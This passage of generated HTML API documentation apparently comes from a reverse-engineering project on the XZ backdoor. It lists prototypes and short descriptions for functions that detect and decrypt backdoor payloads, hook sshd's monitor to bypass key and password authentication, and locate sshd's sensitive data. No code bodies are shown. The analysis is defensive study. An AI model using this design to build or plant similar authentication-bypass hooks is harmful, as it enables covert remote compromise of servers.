<tr class="memdesc:ad32fc521229739df889407c2e9e48475"><td class="mdescLeft">&#160;</td><td class="mdescRight">finds the pointer to <code>struct monitor</code>, and updates the global context in <code>ctx</code> with its location  <a href="xzre_8h.html#ad32fc521229739df889407c2e9e48475">More...</a><br /></td></tr>
<tr class="separator:ad32fc521229739df889407c2e9e48475"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6e2c6750b30e0fa2fcc8ab1f5f17c597"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a6e2c6750b30e0fa2fcc8ab1f5f17c597">sshd_find_main</a> (u8 **code_start_out, <a class="el" href="structelf__info.html">elf_info_t</a> *sshd, <a class="el" href="structelf__info.html">elf_info_t</a> *libcrypto, <a class="el" href="structimported__funcs.html">imported_funcs_t</a> *<a class="el" href="structimported__funcs.html">imported_funcs</a>)</td></tr>
<tr class="memdesc:a6e2c6750b30e0fa2fcc8ab1f5f17c597"><td class="mdescLeft">&#160;</td><td class="mdescRight">finds the sshd_main function  <a href="xzre_8h.html#a6e2c6750b30e0fa2fcc8ab1f5f17c597">More...</a><br /></td></tr>
<tr class="separator:a6e2c6750b30e0fa2fcc8ab1f5f17c597"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8bee0e68cc6b98d6efe609656cfad7d0"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a8bee0e68cc6b98d6efe609656cfad7d0">sshd_find_monitor_field_addr_in_function</a> (u8 *code_start, u8 *code_end, u8 *data_start, u8 *data_end, void **monitor_field_ptr_out, <a class="el" href="structglobal__context.html">global_context_t</a> *ctx)</td></tr>
<tr class="memdesc:a8bee0e68cc6b98d6efe609656cfad7d0"><td class="mdescLeft">&#160;</td><td class="mdescRight">find a pointer to a field in <code>struct monitor</code> by examining code referencing it  <a href="xzre_8h.html#a8bee0e68cc6b98d6efe609656cfad7d0">More...</a><br /></td></tr>
<tr class="separator:a8bee0e68cc6b98d6efe609656cfad7d0"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab71f26da9f55365d74279b9835c9b41c"><td class="memItemLeft" align="right" valign="top">void *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ab71f26da9f55365d74279b9835c9b41c">find_addr_referenced_in_mov_instruction</a> (StringXrefId id, <a class="el" href="structstring__references.html">string_references_t</a> *refs, void *mem_range_start, void *mem_range_end)</td></tr>
<tr class="memdesc:ab71f26da9f55365d74279b9835c9b41c"><td class="mdescLeft">&#160;</td><td class="mdescRight">find an address referenced in a function  <a href="xzre_8h.html#ab71f26da9f55365d74279b9835c9b41c">More...</a><br /></td></tr>
<tr class="separator:ab71f26da9f55365d74279b9835c9b41c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a0b6e4a4a74a67f0e049b2d7973480a95"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a0b6e4a4a74a67f0e049b2d7973480a95">validate_log_handler_pointers</a> (void *addr1, void *addr2, void *search_base, u8 *code_end, <a class="el" href="structstring__references.html">string_references_t</a> *refs, <a class="el" href="structglobal__context.html">global_context_t</a> *global)</td></tr>
<tr class="memdesc:a0b6e4a4a74a67f0e049b2d7973480a95"><td class="mdescLeft">&#160;</td><td class="mdescRight">Validate that the two addresses are the expected/correct ones.  <a href="xzre_8h.html#a0b6e4a4a74a67f0e049b2d7973480a95">More...</a><br /></td></tr>
<tr class="separator:a0b6e4a4a74a67f0e049b2d7973480a95"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aaa520bbc6de39ccb7a4e5013cf66d7aa"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aaa520bbc6de39ccb7a4e5013cf66d7aa">sshd_get_client_socket</a> (<a class="el" href="structglobal__context.html">global_context_t</a> *ctx, int *pSocket, int socket_index, enum SocketMode socket_direction)</td></tr>
<tr class="memdesc:aaa520bbc6de39ccb7a4e5013cf66d7aa"><td class="mdescLeft">&#160;</td><td class="mdescRight">Get either the read or write end of the sshd connection.  <a href="xzre_8h.html#aaa520bbc6de39ccb7a4e5013cf66d7aa">More...</a><br /></td></tr>
<tr class="separator:aaa520bbc6de39ccb7a4e5013cf66d7aa"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a077a435ef7c8a7960451ff5c0cc5dc43"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a077a435ef7c8a7960451ff5c0cc5dc43">sshd_get_usable_socket</a> (int *pSock, int socket_index, <a class="el" href="structlibc__imports.html">libc_imports_t</a> *imports)</td></tr>
<tr class="memdesc:a077a435ef7c8a7960451ff5c0cc5dc43"><td class="mdescLeft">&#160;</td><td class="mdescRight">gets the first usable socket fd  <a href="xzre_8h.html#a077a435ef7c8a7960451ff5c0cc5dc43">More...</a><br /></td></tr>
<tr class="separator:a077a435ef7c8a7960451ff5c0cc5dc43"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a44abb1c444c5d0428c6d67b9e8e38276"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a44abb1c444c5d0428c6d67b9e8e38276">sshd_get_sshbuf</a> (struct sshbuf *sshbuf, <a class="el" href="structglobal__context.html">global_context_t</a> *ctx)</td></tr>
<tr class="memdesc:a44abb1c444c5d0428c6d67b9e8e38276"><td class="mdescLeft">&#160;</td><td class="mdescRight">Finds the right <code>sshbuf</code> (FIXME: which?), starting from: <code>(*(ctx-&gt;struct_monitor_ptr_address))-&gt;kex-&gt;my</code>  <a href="xzre_8h.html#a44abb1c444c5d0428c6d67b9e8e38276">More...</a><br /></td></tr>
<tr class="separator:a44abb1c444c5d0428c6d67b9e8e38276"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a657f411379e9d088996d8722b82eeefd"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a657f411379e9d088996d8722b82eeefd">sshd_kex_sshbuf_get</a> (void *kex, <a class="el" href="structglobal__context.html">global_context_t</a> *ctx, void **pOutputData, size_t *pOutputSize)</td></tr>
<tr class="memdesc:a657f411379e9d088996d8722b82eeefd"><td class="mdescLeft">&#160;</td><td class="mdescRight">locates an sshbuf within <code>struct kex</code> (FIXME: which?)  <a href="xzre_8h.html#a657f411379e9d088996d8722b82eeefd">More...</a><br /></td></tr>
<tr class="separator:a657f411379e9d088996d8722b82eeefd"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a0c558b4d23018ab4e177dfd14f186be9"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a0c558b4d23018ab4e177dfd14f186be9">is_payload_message</a> (u8 *sshbuf_data, size_t sshbuf_size, size_t *pOutPayloadSize, <a class="el" href="structglobal__context.html">global_context_t</a> *ctx)</td></tr>
<tr class="memdesc:a0c558b4d23018ab4e177dfd14f186be9"><td class="mdescLeft">&#160;</td><td class="mdescRight">checks if the given sshbuf buffer contains a backdoor payload message  <a href="xzre_8h.html#a0c558b4d23018ab4e177dfd14f186be9">More...</a><br /></td></tr>
<tr class="separator:a0c558b4d23018ab4e177dfd14f186be9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a91ced8a70c0e916ae8289e4ad77fbd47"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a91ced8a70c0e916ae8289e4ad77fbd47">decrypt_payload_message</a> (void *payload, size_t payload_size, <a class="el" href="structglobal__context.html">global_context_t</a> *ctx)</td></tr>
<tr class="memdesc:a91ced8a70c0e916ae8289e4ad77fbd47"><td class="mdescLeft">&#160;</td><td class="mdescRight">decrypts the given backdoor payload  <a href="xzre_8h.html#a91ced8a70c0e916ae8289e4ad77fbd47">More...</a><br /></td></tr>
<tr class="separator:a91ced8a70c0e916ae8289e4ad77fbd47"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8412cd4edc81e13f4041a11dd7a59f33"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a8412cd4edc81e13f4041a11dd7a59f33">check_backdoor_state</a> (<a class="el" href="structglobal__context.html">global_context_t</a> *ctx)</td></tr>
<tr class="memdesc:a8412cd4edc81e13f4041a11dd7a59f33"><td class="mdescLeft">&#160;</td><td class="mdescRight">checks if the backdoor state is the expected one (FIXME: which?)  <a href="xzre_8h.html#a8412cd4edc81e13f4041a11dd7a59f33">More...</a><br /></td></tr>
<tr class="separator:a8412cd4edc81e13f4041a11dd7a59f33"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8ce260e9315b4afa70668391058ed484"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a8ce260e9315b4afa70668391058ed484">mm_answer_keyallowed_hook</a> (struct ssh *ssh, int sock, struct sshbuf *m)</td></tr>
<tr class="memdesc:a8ce260e9315b4afa70668391058ed484"><td class="mdescLeft">&#160;</td><td class="mdescRight">runs the payload received from <a class="el" href="xzre_8h.html#a60b93ed64ba904012e9fa9477e97a244">sshd_proxy_elevate</a>, and then runs the original <code>mm_answer_keyallowed</code> function  <a href="xzre_8h.html#a8ce260e9315b4afa70668391058ed484">More...</a><br /></td></tr>
<tr class="separator:a8ce260e9315b4afa70668391058ed484"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a99eb76809c798f3bcae98526992e63ef"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a99eb76809c798f3bcae98526992e63ef">mm_answer_keyverify_hook</a> (struct ssh *ssh, int sock, struct sshbuf *m)</td></tr>
<tr class="memdesc:a99eb76809c798f3bcae98526992e63ef"><td class="mdescLeft">&#160;</td><td class="mdescRight">used in conjunction with <a class="el" href="xzre_8h.html#a8ce260e9315b4afa70668391058ed484">mm_answer_keyallowed_hook</a> to bypass the key validity check  <a href="xzre_8h.html#a99eb76809c798f3bcae98526992e63ef">More...</a><br /></td></tr>
<tr class="separator:a99eb76809c798f3bcae98526992e63ef"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ace15703b7d962e9d6be778e4d8066f79"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ace15703b7d962e9d6be778e4d8066f79">mm_answer_authpassword_hook</a> (struct ssh *ssh, int sock, struct sshbuf *m)</td></tr>
<tr class="memdesc:ace15703b7d962e9d6be778e4d8066f79"><td class="mdescLeft">&#160;</td><td class="mdescRight">used to bypass password authentication by replying with a successful <code>MONITOR_ANS_AUTHPASSWORD</code>  <a href="xzre_8h.html#ace15703b7d962e9d6be778e4d8066f79">More...</a><br /></td></tr>
<tr class="separator:ace15703b7d962e9d6be778e4d8066f79"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a096fbb5b183337e44012a38910ea31eb"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a096fbb5b183337e44012a38910ea31eb">mm_log_handler_hook</a> (LogLevel level, int forced, const char *msg, void *ctx)</td></tr>
<tr class="separator:a096fbb5b183337e44012a38910ea31eb"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a443ee065f54857cd4c559963df5a7b85"><td class="memItemLeft" align="right" valign="top">ssize_t&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a443ee065f54857cd4c559963df5a7b85">fd_read</a> (int fd, void *buffer, size_t count, <a class="el" href="structlibc__imports.html">libc_imports_t</a> *funcs)</td></tr>
<tr class="memdesc:a443ee065f54857cd4c559963df5a7b85"><td class="mdescLeft">&#160;</td><td class="mdescRight">reads data from the specified file descriptor  <a href="xzre_8h.html#a443ee065f54857cd4c559963df5a7b85">More...</a><br /></td></tr>
<tr class="separator:a443ee065f54857cd4c559963df5a7b85"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a1c7515ae18e8ded5ffe02d66b9f6bffb"><td class="memItemLeft" align="right" valign="top">ssize_t&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a1c7515ae18e8ded5ffe02d66b9f6bffb">fd_write</a> (int fd, void *buffer, size_t count, <a class="el" href="structlibc__imports.html">libc_imports_t</a> *funcs)</td></tr>
<tr class="memdesc:a1c7515ae18e8ded5ffe02d66b9f6bffb"><td class="mdescLeft">&#160;</td><td class="mdescRight">reads data to the specified file descriptor  <a href="xzre_8h.html#a1c7515ae18e8ded5ffe02d66b9f6bffb">More...</a><br /></td></tr>
<tr class="separator:a1c7515ae18e8ded5ffe02d66b9f6bffb"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a49d6b781406209d412b2dfadd3c7d95f"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a49d6b781406209d412b2dfadd3c7d95f">contains_null_pointers</a> (void **pointers, unsigned int num_pointers)</td></tr>
<tr class="memdesc:a49d6b781406209d412b2dfadd3c7d95f"><td class="mdescLeft">&#160;</td><td class="mdescRight">checks if the given array of pointers contains any NULL pointer  <a href="xzre_8h.html#a49d6b781406209d412b2dfadd3c7d95f">More...</a><br /></td></tr>
<tr class="separator:a49d6b781406209d412b2dfadd3c7d95f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a844d7f178bc2d12ee2dbf33985736fa0"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a844d7f178bc2d12ee2dbf33985736fa0">count_pointers</a> (void **ptrs, u64 *count_out, <a class="el" href="structlibc__imports.html">libc_imports_t</a> *funcs)</td></tr>
<tr class="memdesc:a844d7f178bc2d12ee2dbf33985736fa0"><td class="mdescLeft">&#160;</td><td class="mdescRight">count the number of non-NULL pointers in the <code>malloc</code>'d memory block <code>ptrs</code>  <a href="xzre_8h.html#a844d7f178bc2d12ee2dbf33985736fa0">More...</a><br /></td></tr>
<tr class="separator:a844d7f178bc2d12ee2dbf33985736fa0"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aba4e5fd0dc2a11aa89a59865cc68807c"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aba4e5fd0dc2a11aa89a59865cc68807c">sshd_configure_log_hook</a> (<a class="el" href="structcmd__arguments.html">cmd_arguments_t</a> *cmd_flags, <a class="el" href="structglobal__context.html">global_context_t</a> *ctx)</td></tr>
<tr class="memdesc:aba4e5fd0dc2a11aa89a59865cc68807c"><td class="mdescLeft">&#160;</td><td class="mdescRight">configure the log hook  <a href="xzre_8h.html#aba4e5fd0dc2a11aa89a59865cc68807c">More...</a><br /></td></tr>
<tr class="separator:aba4e5fd0dc2a11aa89a59865cc68807c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:adbd2f206ddcca1e6919558e0548990d7"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#adbd2f206ddcca1e6919558e0548990d7">sshd_log</a> (<a class="el" href="structsshd__log__ctx.html">sshd_log_ctx_t</a> *log_ctx, LogLevel level, const char *fmt,...)</td></tr>
<tr class="memdesc:adbd2f206ddcca1e6919558e0548990d7"><td class="mdescLeft">&#160;</td><td class="mdescRight">calls <code>sshlogv</code> from openssh, similarly to <code>sshlog</code> in openssh  <a href="xzre_8h.html#adbd2f206ddcca1e6919558e0548990d7">More...</a><br /></td></tr>
<tr class="separator:adbd2f206ddcca1e6919558e0548990d7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5f865a1a2eb6a32980c4336b2290e17e"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a5f865a1a2eb6a32980c4336b2290e17e">sshd_find_sensitive_data</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *sshd, <a class="el" href="structelf__info.html">elf_info_t</a> *libcrypto, <a class="el" href="structstring__references.html">string_references_t</a> *refs, <a class="el" href="structimported__funcs.html">imported_funcs_t</a> *funcs, <a class="el" href="structglobal__context.html">global_context_t</a> *ctx)</td></tr>
<tr class="memdesc:a5f865a1a2eb6a32980c4336b2290e17e"><td class="mdescLeft">&#160;</td><td class="mdescRight">locates <code><a class="el" href="structsensitive__data.html" title="struct sensitive_data from openssh-portable">sensitive_data</a></code> within sshd, and resolves some additional libcrypto functions  <a href="xzre_8h.html#a5f865a1a2eb6a32980c4336b2290e17e">More...</a><br /></td></tr>
<tr class="separator:a5f865a1a2eb6a32980c4336b2290e17e"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table><table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a name="var-members"></a>
Variables</h2></td></tr>
<tr class="memitem:ab9c7b9765c15a48fbed3d1a8daf1b27f"><td class="memItemLeft" align="right" valign="top">u32&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ab9c7b9765c15a48fbed3d1a8daf1b27f">resolver_call_count</a></td></tr>
<tr class="memdesc:ab9c7b9765c15a48fbed3d1a8daf1b27f"><td class="mdescLeft">&#160;</td><td class="mdescRight">counts the number of times the IFUNC resolver is called  <a href="xzre_8h.html#ab9c7b9765c15a48fbed3d1a8daf1b27f">More...</a><br /></td></tr>
<tr class="separator:ab9c7b9765c15a48fbed3d1a8daf1b27f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aba335b5173c376997dd9e8686255413c"><td class="memItemLeft" align="right" valign="top"><a id="aba335b5173c376997dd9e8686255413c"></a>
<a class="el" href="structglobal__context.html">global_context_t</a> *&#160;</td><td class="memItemRight" valign="bottom"><b>global_ctx</b></td></tr>
<tr class="separator:aba335b5173c376997dd9e8686255413c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a32c97a88bc607d3f2459f0d7d420099d"><td class="memItemLeft" align="right" valign="top"><a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a> *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a32c97a88bc607d3f2459f0d7d420099d">hooks_data_addr</a></td></tr>
<tr class="memdesc:a32c97a88bc607d3f2459f0d7d420099d"><td class="mdescLeft">&#160;</td><td class="mdescRight">location of backdoor_hooks_data_t  <a href="xzre_8h.html#a32c97a88bc607d3f2459f0d7d420099d">More...</a><br /></td></tr>
<tr class="separator:a32c97a88bc607d3f2459f0d7d420099d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aaab5bc3cf0e40bb0aa5bc72a3fd05fbe"><td class="memItemLeft" align="right" valign="top">const ptrdiff_t&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aaab5bc3cf0e40bb0aa5bc72a3fd05fbe">fake_lzma_allocator_offset</a></td></tr>
<tr class="memdesc:aaab5bc3cf0e40bb0aa5bc72a3fd05fbe"><td class="mdescLeft">&#160;</td><td class="mdescRight">special .data.rel.ro section that contains the offset to fake_lzma_allocator_struct  <a href="xzre_8h.html#aaab5bc3cf0e40bb0aa5bc72a3fd05fbe">More...</a><br /></td></tr>
<tr class="separator:aaab5bc3cf0e40bb0aa5bc72a3fd05fbe"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a654fa519cae913e8f1b0c5ad54f8cc3a"><td class="memItemLeft" align="right" valign="top"><a class="el" href="structfake__lzma__allocator.html">fake_lzma_allocator_t</a>&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a654fa519cae913e8f1b0c5ad54f8cc3a">fake_lzma_allocator</a></td></tr>
<tr class="memdesc:a654fa519cae913e8f1b0c5ad54f8cc3a"><td class="mdescLeft">&#160;</td><td class="mdescRight">special .data.rel.ro section that contains a fake lzma_allocator  <a href="xzre_8h.html#a654fa519cae913e8f1b0c5ad54f8cc3a">More...</a><br /></td></tr>
<tr class="separator:a654fa519cae913e8f1b0c5ad54f8cc3a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4623e8d4254091bcbffbead1ee7ed2ff"><td class="memItemLeft" align="right" valign="top">const ptrdiff_t&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a4623e8d4254091bcbffbead1ee7ed2ff">elf_functions_offset</a></td></tr>
<tr class="memdesc:a4623e8d4254091bcbffbead1ee7ed2ff"><td class="mdescLeft">&#160;</td><td class="mdescRight">special .data.rel.ro section that contains the offset to <a class="el" href="structelf__functions.html">elf_functions</a>  <a href="xzre_8h.html#a4623e8d4254091bcbffbead1ee7ed2ff">More...</a><br /></td></tr>
<tr class="separator:a4623e8d4254091bcbffbead1ee7ed2ff"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a43a1216740525fdfa050474fc9b91a57"><td class="memItemLeft" align="right" valign="top">const <a class="el" href="structelf__functions.html">elf_functions_t</a>&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a43a1216740525fdfa050474fc9b91a57">elf_functions</a></td></tr>
<tr class="memdesc:a43a1216740525fdfa050474fc9b91a57"><td class="mdescLeft">&#160;</td><td class="mdescRight">special .data.rel.ro section that contains addresses to various functions  <a href="xzre_8h.html#a43a1216740525fdfa050474fc9b91a57">More...</a><br /></td></tr>
<tr class="separator:a43a1216740525fdfa050474fc9b91a57"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac7d6a45076bf21904bac3163ae57090e"><td class="memItemLeft" align="right" valign="top">const u64&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ac7d6a45076bf21904bac3163ae57090e">cpuid_random_symbol</a></td></tr>
<tr class="memdesc:ac7d6a45076bf21904bac3163ae57090e"><td class="mdescLeft">&#160;</td><td class="mdescRight">a bogus global variable that is used by the backdoor to generate an extra symbol  <a href="xzre_8h.html#ac7d6a45076bf21904bac3163ae57090e">More...</a><br /></td></tr>
<tr class="separator:ac7d6a45076bf21904bac3163ae57090e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3101b150fe0226a632314e2fa473aba1"><td class="memItemLeft" align="right" valign="top">const u64&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a3101b150fe0226a632314e2fa473aba1">tls_get_addr_random_symbol</a></td></tr>
<tr class="memdesc:a3101b150fe0226a632314e2fa473aba1"><td class="mdescLeft">&#160;</td><td class="mdescRight">a bogus global variable that is used by the backdoor to generate an extra symbol  <a href="xzre_8h.html#a3101b150fe0226a632314e2fa473aba1">More...</a><br /></td></tr>
<tr class="separator:a3101b150fe0226a632314e2fa473aba1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6ee0871d6d6f7544176777c8f00244b7"><td class="memItemLeft" align="right" valign="top">const <a class="el" href="structbackdoor__cpuid__reloc__consts.html">backdoor_cpuid_reloc_consts_t</a>&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a6ee0871d6d6f7544176777c8f00244b7">cpuid_reloc_consts</a></td></tr>
<tr class="memdesc:a6ee0871d6d6f7544176777c8f00244b7"><td class="mdescLeft">&#160;</td><td class="mdescRight">special .rodata section that contains _cpuid() related GOT offsets  <a href="xzre_8h.html#a6ee0871d6d6f7544176777c8f00244b7">More...</a><br /></td></tr>
<tr class="separator:a6ee0871d6d6f7544176777c8f00244b7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aadd306e1b2b33d0306f1995e0a83dae7"><td class="memItemLeft" align="right" valign="top">const <a class="el" href="structbackdoor__tls__get__addr__reloc__consts.html">backdoor_tls_get_addr_reloc_consts_t</a>&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aadd306e1b2b33d0306f1995e0a83dae7">tls_get_addr_reloc_consts</a></td></tr>
<tr class="memdesc:aadd306e1b2b33d0306f1995e0a83dae7"><td class="mdescLeft">&#160;</td><td class="mdescRight">special .rodata section that contains __tls_get_addr() related GOT offsets  <a href="xzre_8h.html#aadd306e1b2b33d0306f1995e0a83dae7">More...</a><br /></td></tr>
<tr class="separator:aadd306e1b2b33d0306f1995e0a83dae7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8c67ac851c8ec7f40c406b286233f98e"><td class="memItemLeft" align="right" valign="top">const u64&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a8c67ac851c8ec7f40c406b286233f98e">string_mask_data</a> [238]</td></tr>
<tr class="memdesc:a8c67ac851c8ec7f40c406b286233f98e"><td class="mdescLeft">&#160;</td><td class="mdescRight">contains mask data for the encoded string radix tree  <a href="xzre_8h.html#a8c67ac851c8ec7f40c406b286233f98e">More...</a><br /></td></tr>
<tr class="separator:a8c67ac851c8ec7f40c406b286233f98e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a53450f0faa9d81b24f8cee5731b51a58"><td class="memItemLeft" align="right" valign="top">const u32&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a53450f0faa9d81b24f8cee5731b51a58">string_action_data</a> [1304]</td></tr>
<tr class="memdesc:a53450f0faa9d81b24f8cee5731b51a58"><td class="mdescLeft">&#160;</td><td class="mdescRight">contains action data for the encoded string radix tree  <a href="xzre_8h.html#a53450f0faa9d81b24f8cee5731b51a58">More...</a><br /></td></tr>
<tr class="separator:a53450f0faa9d81b24f8cee5731b51a58"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table>
<a name="details" id="details"></a><h2 class="groupheader">Detailed Description</h2>
<div class="textblock"><p>XZ backdoor structures and functions. </p>
<dl class="section author"><dt>Author</dt><dd>Stefano Moioli (<a href="#" onclick="location.href='mai'+'lto:'+'smx'+'de'+'v4@'+'gm'+'ail'+'.c'+'om'; return false;">smxde<span style="display: none;">.nosp@m.</span>v4@g<span style="display: none;">.nosp@m.</span>mail.<span style="display: none;">.nosp@m.</span>com</a>) </dd></dl>
</div><h2 class="groupheader">Typedef Documentation</h2>
<a id="a65ea88969746c06d6c0d0b1586f610db"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a65ea88969746c06d6c0d0b1586f610db">&#9670;&nbsp;</a></span>elf_handles_t</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">typedef struct <a class="el" href="structelf__handles.html">elf_handles</a> <a class="el" href="xzre_8h.html#a65ea88969746c06d6c0d0b1586f610db">elf_handles_t</a></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>array of ELF handles </p>
<dl class="section see"><dt>See also</dt><dd><a class="el" href="xzre_8h.html#a3ed7f6d009d35ae3bdb830a7bb1e0289">ElfId</a> maps the indices </dd></dl>

</div>
</div>
<a id="a14e14daa7c876bbbe0dc552f840494f8"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a14e14daa7c876bbbe0dc552f840494f8">&#9670;&nbsp;</a></span>gnu_hash_table_t</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">typedef struct <a class="el" href="structgnu__hash__table.html">gnu_hash_table</a> <a class="el" href="xzre_8h.html#a14e14daa7c876bbbe0dc552f840494f8">gnu_hash_table_t</a></td>
        </tr>
      </table>
</div><div class="memdoc">
<p>reference: <a href="https://flapenguin.me/elf-dt-gnu-hash">https://flapenguin.me/elf-dt-gnu-hash</a> </p>

</div>
</div>
<a id="a41b1410a6c3d2613895ce26896903600"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a41b1410a6c3d2613895ce26896903600">&#9670;&nbsp;</a></span>key_payload_hdr_t</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">typedef struct <a class="el" href="structkey__payload__hdr.html">key_payload_hdr</a> <a class="el" href="xzre_8h.html#a41b1410a6c3d2613895ce26896903600">key_payload_hdr_t</a></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>the payload header. also used as Chacha IV </p>
<dl class="section return"><dt>Returns</dt><dd>typedef struct </dd></dl>

</div>
</div>
<a id="aaad9381e8f52552bbb914465c45bdac2"></a>
<h2 class="memtitle"><span class="permalink"><a href="#aaad9381e8f52552bbb914465c45bdac2">&#9670;&nbsp;</a></span>key_payload_t</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">typedef struct <a class="el" href="structkey__payload.html">key_payload</a> <a class="el" href="xzre_8h.html#aaad9381e8f52552bbb914465c45bdac2">key_payload_t</a></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>the contents of the RSA 'n' field </p>
<dl class="section return"><dt>Returns</dt><dd>typedef struct </dd></dl>

</div>
</div>
<h2 class="groupheader">Enumeration Type Documentation</h2>
<a id="a5f8f63d8ae502ab76547c7b077cb067c"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a5f8f63d8ae502ab76547c7b077cb067c">&#9670;&nbsp;</a></span>CommandFlags1</h2>

<div class="memitem">
<div class="memproto">
